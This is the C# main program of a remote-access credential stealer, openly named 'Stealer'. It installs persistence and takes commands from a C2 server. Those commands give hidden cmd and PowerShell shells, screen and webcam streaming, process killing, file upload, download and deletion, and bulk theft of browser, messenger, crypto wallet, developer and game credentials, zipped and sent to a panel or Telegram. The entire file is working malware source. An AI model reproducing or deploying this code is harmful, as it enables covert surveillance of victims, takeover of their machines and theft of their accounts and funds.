using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Globalization;
using System.Diagnostics;
using Stealer.Collectors;
using Stealer.Utils;

namespace Stealer
{
    class Program
    {
        private static string _clientId;

        // ── Persistent shells ──────────────────────────────────────────────
        private const string SHELL_DONE   = "==AEST_DONE==";
        private const string SHELL_CWD    = "==AEST_CWD==";

        private static Process _cmdShell;
        private static readonly object _cmdLock = new object();
        private static readonly StringBuilder _cmdOut = new StringBuilder();
        private static readonly StringBuilder _cmdErr = new StringBuilder();
        private static readonly ManualResetEventSlim _cmdReady = new ManualResetEventSlim(false);

        private static Process _psShell;
        private static readonly object _psLock = new object();
        private static readonly StringBuilder _psOut = new StringBuilder();
        private static readonly StringBuilder _psErr = new StringBuilder();
        private static readonly ManualResetEventSlim _psReady = new ManualResetEventSlim(false);
        // ──────────────────────────────────────────────────────────────────

        private static readonly string CrashLog = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "whm_crash.log");

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += (s, e) =>
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " UNHANDLED: " + e.ExceptionObject + "\r\n"); } catch { }
            };

            try
            {
                Config.Initialize();
                _clientId = Environment.MachineName + "_" + Environment.UserName;

                try { Persistence.Install(); } catch { }

                C2Client.Connect(_clientId, HandleCommand);
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " MAIN ERR: " + ex + "\r\n"); } catch { }
            }

            while (true) { Thread.Sleep(60000); }
        }

        private static void HandleCommand(string command)
        {
            string cmd = command.Trim();
            string cmdLower = cmd.ToLower();

            if (cmdLower == "steal")
            {
                RunStealer();
            }
            else if (cmdLower == "uninstall")
            {
                try { Persistence.Uninstall(); } catch { }
                Environment.Exit(0);
            }
            else if (cmdLower.StartsWith("rdp_start"))
            {
                int fps = 5;
                int quality = 50;
                StreamMode mode = StreamMode.TileDelta;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4 && int.TryParse(parts[3], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        mode = (StreamMode)modeVal;
                }
                ScreenStream.Start(fps, quality, mode);
            }
            else if (cmdLower.StartsWith("rdp_mode"))
            {
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2 && int.TryParse(parts[1], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        ScreenStream.SetMode((StreamMode)modeVal);
                }
            }
            else if (cmdLower == "rdp_stop")
            {
                ScreenStream.Stop();
            }
            else if (cmdLower.StartsWith("camera_start"))
            {
                int fps = 5;
                int quality = 50;
                int camIndex = 0;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4) int.TryParse(parts[3], out camIndex);
                CameraStream.Start(fps, quality, camIndex);
            }
            else if (cmdLower == "camera_stop")
            {
                CameraStream.Stop();
            }
            else if (cmdLower == "camera_list")
            {
                string jsonList = CameraStream.GetCameraListJson();
                C2Client.SendText("{\"type\":\"camera_list\",\"devices\":" + jsonList + "}");
            }
            else if (cmdLower.StartsWith("exec_cmd:"))
            {
                string payload = cmd.Substring("exec_cmd:".Length);
                RunPersistentCmd(payload);
            }
            else if (cmdLower.StartsWith("exec_ps:"))
            {
                string payload = cmd.Substring("exec_ps:".Length);
                RunPersistentPs(payload);
            }
            else if (cmdLower == "shell_reset")
            {
                lock (_cmdLock) { try { _cmdShell?.Kill(); } catch { } _cmdShell = null; }
                lock (_psLock)  { try { _psShell?.Kill();  } catch { } _psShell  = null; }
            }
            else if (cmdLower == "tasklist")
            {
                GetTaskList();
            }
            else if (cmdLower.StartsWith("kill:"))
            {
                string pidStr = cmd.Substring("kill:".Length);
                if (int.TryParse(pidStr, out int pid))
                {
                    KillProcess(pid);
                }
            }
            else if (cmdLower.StartsWith("fm_list:"))
            {
                FmListDirectory(cmd.Substring("fm_list:".Length));
            }
            else if (cmdLower.StartsWith("fm_download:"))
            {
                FmDownloadFile(cmd.Substring("fm_download:".Length));
            }
            else if (cmdLower.StartsWith("fm_delete:"))
            {
                FmDelete(cmd.Substring("fm_delete:".Length));
            }
            else if (cmdLower.StartsWith("fm_upload:"))
            {
                string rest = cmd.Substring("fm_upload:".Length);
                int sep = rest.IndexOf('|');
                if (sep > 0)
                    FmUploadFile(rest.Substring(0, sep), rest.Substring(sep + 1));
            }
        }

        private static Encoding OemEnc => Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage);

        private static void EnsureCmdShell()
        {
            if (_cmdShell != null && !_cmdShell.HasExited) return;
            try { _cmdShell?.Kill(); _cmdShell?.Dispose(); } catch { }

            var psi = new ProcessStartInfo("cmd.exe")
            {
                UseShellExecute = false,
                RedirectStandardInput  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow = true,
                StandardOutputEncoding = OemEnc,
                StandardErrorEncoding  = OemEnc
            };
            _cmdShell = Process.Start(psi);

            _cmdShell.OutputDataReceived += (s, e) =>
            {
                if (e.Data == null) return;
                if (e.Data.TrimEnd() == SHELL_DONE) { _cmdReady.Set(); return; }
                if (e.Data.StartsWith(SHELL_CWD))   return; // consumed by SendCmdResult
                _cmdOut.AppendLine(e.Data);
            };
            _cmdShell.ErrorDataReceived += (s, e) =>
            {
                if (e.Data != null) _cmdErr.AppendLine(e.Data);
            };
            _cmdShell.BeginOutputReadLine();
            _cmdShell.BeginErrorReadLine();

            // Drain initial banner
            _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();
            _cmdShell.StandardInput.WriteLine("echo " + SHELL_DONE);
            _cmdShell.StandardInput.Flush();
            _cmdReady.Wait(3000);
            _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();
        }

        private static void RunPersistentCmd(string payload)
        {
            Task.Run(() =>
            {
                lock (_cmdLock)
                {
                    try
                    {
                        EnsureCmdShell();
                        _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();

                        _cmdShell.StandardInput.WriteLine(payload);
                        _cmdShell.StandardInput.WriteLine("echo " + SHELL_CWD + "%CD%");
                        _cmdShell.StandardInput.WriteLine("echo " + SHELL_DONE);
                        _cmdShell.StandardInput.Flush();

                        bool ok = _cmdReady.Wait(15000);

                        // Extract CWD from output before clearing
                        string rawOut = _cmdOut.ToString();
                        string cwd = "";
                        foreach (string ln in rawOut.Split('\n'))
                        {
                            string t = ln.Trim();
                            if (t.StartsWith(SHELL_CWD))
                            {
                                cwd = t.Substring(SHELL_CWD.Length).Trim();
                                rawOut = rawOut.Replace(ln, "").Replace(ln.TrimEnd(), "");
                            }
                        }

                        string stdout = rawOut.TrimEnd();
                        string stderr = _cmdErr.ToString().TrimEnd();
                        string result = string.IsNullOrEmpty(stderr) ? stdout
                            : (string.IsNullOrEmpty(stdout) ? "[STDERR]\r\n" + stderr
                            : stdout + "\r\n[STDERR]\r\n" + stderr);
                        if (!ok) result += "\r\n[TIMEOUT]";

                        SendShellResult("cmd_res", result, cwd);
                    }
                    catch (Exception ex)
                    {
                        try { _cmdShell?.Kill(); } catch { } _cmdShell = null;
                        SendShellResult("cmd_res", "[ERROR] " + ex.Message, "");
                    }
                }
            });
        }

        private static void EnsurePsShell()
        {
            if (_psShell != null && !_psShell.HasExited) return;
            try { _psShell?.Kill(); _psShell?.Dispose(); } catch { }

            var psi = new ProcessStartInfo("powershell.exe",
                "-NoProfile -NoExit -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; $PSDefaultParameterValues['Out-File:Encoding']='utf8'\"")
            {
                UseShellExecute = false,
                RedirectStandardInput  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding  = Encoding.UTF8
            };
            _psShell = Process.Start(psi);

            _psShell.OutputDataReceived += (s, e) =>
            {
                if (e.Data == null) return;
                if (e.Data.TrimEnd() == SHELL_DONE) { _psReady.Set(); return; }
                _psOut.AppendLine(e.Data);
            };
            _psShell.ErrorDataReceived += (s, e) =>
            {
                if (e.Data != null) _psErr.AppendLine(e.Data);
            };
            _psShell.BeginOutputReadLine();
            _psShell.BeginErrorReadLine();

            // Drain banner
            _psOut.Clear(); _psErr.Clear(); _psReady.Reset();
            _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
            _psShell.StandardInput.Flush();
            _psReady.Wait(5000);
            _psOut.Clear(); _psErr.Clear(); _psReady.Reset();
        }

        private static void RunPersistentPs(string payload)
        {
            Task.Run(() =>
            {
                lock (_psLock)
                {
                    try
                    {
                        EnsurePsShell();
                        _psOut.Clear(); _psErr.Clear(); _psReady.Reset();

                        _psShell.StandardInput.WriteLine(payload);
                        _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
                        _psShell.StandardInput.Flush();

                        bool ok = _psReady.Wait(15000);

                        string cwd = "";
                        try
                        {
                            // Get CWD separately
                            var sb2 = new StringBuilder(); var ev2 = new ManualResetEventSlim(false);
                            DataReceivedEventHandler h = null;
                            h = (s, e) => { if (e.Data == null) return; if (e.Data.TrimEnd() == SHELL_DONE) { ev2.Set(); return; } sb2.AppendLine(e.Data); };
                            _psShell.OutputDataReceived += h;
                            _psShell.StandardInput.WriteLine("(Get-Location).Path");
                            _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
                            _psShell.StandardInput.Flush();
                            ev2.Wait(3000);
                            _psShell.OutputDataReceived -= h;
                            cwd = sb2.ToString().Trim();
                        }
                        catch { }

                        string stdout = _psOut.ToString().TrimEnd();
                        string stderr = _psErr.ToString().TrimEnd();
                        string result = string.IsNullOrEmpty(stderr) ? stdout
                            : (string.IsNullOrEmpty(stdout) ? "[STDERR]\r\n" + stderr
                            : stdout + "\r\n[STDERR]\r\n" + stderr);
                        if (!ok) result += "\r\n[TIMEOUT]";

                        SendShellResult("ps_res", result, cwd);
                    }
                    catch (Exception ex)
                    {
                        try { _psShell?.Kill(); } catch { } _psShell = null;
                        SendShellResult("ps_res", "[ERROR] " + ex.Message, "");
                    }
                }
            });
        }

        private static void SendShellResult(string type, string output, string cwd)
        {
            string esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                .Replace("\r", "\\r").Replace("\n", "\\n");
            string cwdPart = string.IsNullOrEmpty(cwd) ? "" : ",\"cwd\":\"" + esc(cwd) + "\"";
            C2Client.SendText("{\"type\":\"" + type + "\",\"output\":\"" + esc(output) + "\"" + cwdPart + "}");
        }

        private static void GetTaskList()
        {
            Task.Run(() =>
            {
                try
                {
                    var procs = System.Diagnostics.Process.GetProcesses();
                    var list = new System.Collections.Generic.List<string>();
                    foreach (var p in procs)
                    {
                        try
                        {
                            string pName = p.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
                            string windowTitle = (p.MainWindowTitle ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "");
                            long mem = 0;
                            try { mem = p.WorkingSet64 / 1024 / 1024; } catch { }
                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + "}");
                        }
                        catch { }
                    }
                    string json = "[" + string.Join(",", list.ToArray()) + "]";
                    C2Client.SendText("{\"type\":\"tasklist_res\",\"tasks\":" + json + "}");
                }
                catch { }
            });
        }

        private static void KillProcess(int pid)
        {
            Task.Run(() =>
            {
                try
                {
                    var p = System.Diagnostics.Process.GetProcessById(pid);
                    p.Kill();
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":true,\"pid\":" + pid + "}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmListDirectory(string path)
        {
            Task.Run(() =>
            {
                try
                {
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    var items = new System.Collections.Generic.List<string>();

                    if (string.IsNullOrEmpty(path))
                    {
                        foreach (var drive in System.IO.DriveInfo.GetDrives())
                        {
                            try
                            {
                                string n = drive.Name.Replace("\\", "\\\\");
                                string label = "";
                                try { label = (drive.VolumeLabel ?? "").Replace("\"", "\\\""); } catch { }
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"drive\",\"size\":0,\"modified\":\"\",\"label\":\"" + label + "\"}");
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        var dir = new System.IO.DirectoryInfo(path);
                        foreach (var d in dir.GetDirectories())
                        {
                            try
                            {
                                string n = d.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                string mod = d.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"" + mod + "\"}");
                            }
                            catch { }
                        }
                        foreach (var f in dir.GetFiles())
                        {
                            try
                            {
                                string n = f.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                string mod = f.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"file\",\"size\":" + f.Length + ",\"modified\":\"" + mod + "\"}");
                            }
                            catch { }
                        }
                    }

                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"items\":[" + string.Join(",", items.ToArray()) + "]}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\",\"items\":[]}");
                }
            });
        }

        private static void FmDownloadFile(string path)
        {
            Task.Run(() =>
            {
                try
                {
                    var fi = new System.IO.FileInfo(path);
                    if (fi.Length > 52428800)
                    {
                        string pathEsc2 = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                        C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc2 + "\",\"error\":\"File too large (>50MB)\"}");
                        return;
                    }
                    byte[] data = System.IO.File.ReadAllBytes(path);
                    string b64 = Convert.ToBase64String(data);
                    string name = System.IO.Path.GetFileName(path).Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"name\":\"" + name + "\",\"data\":\"" + b64 + "\"}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmDelete(string path)
        {
            Task.Run(() =>
            {
                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                try
                {
                    if (System.IO.Directory.Exists(path))
                        System.IO.Directory.Delete(path, true);
                    else
                        System.IO.File.Delete(path);
                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmUploadFile(string path, string b64data)
        {
            Task.Run(() =>
            {
                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                try
                {
                    byte[] data = Convert.FromBase64String(b64data);
                    string dir = System.IO.Path.GetDirectoryName(path);
                    if (!string.IsNullOrEmpty(dir) && !System.IO.Directory.Exists(dir))
                        System.IO.Directory.CreateDirectory(dir);
                    System.IO.File.WriteAllBytes(path, data);
                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void RunStealer()
        {
            try
            {
                using (var zip = new InMemoryZip())
                {
                    SystemInfoCollector.Collect(zip);
                    ChromiumCollector.Collect(zip);
                    GeckoCollector.Collect(zip);
                    MessengersCollector.Collect(zip);
                    CryptoCollector.Collect(zip);
                    IDECollector.Collect(zip);
                    GamesCollector.Collect(zip);
                    ServersCollector.Collect(zip);

                    if (zip.Count == 0) return;

                    byte[] zipData = zip.ToArray();
                    string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";

                    if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        Task.Run(() => PanelSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                    else
                    {
                        Task.Run(() => TelegramSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                }
            }
            catch { }
        }
    }
}
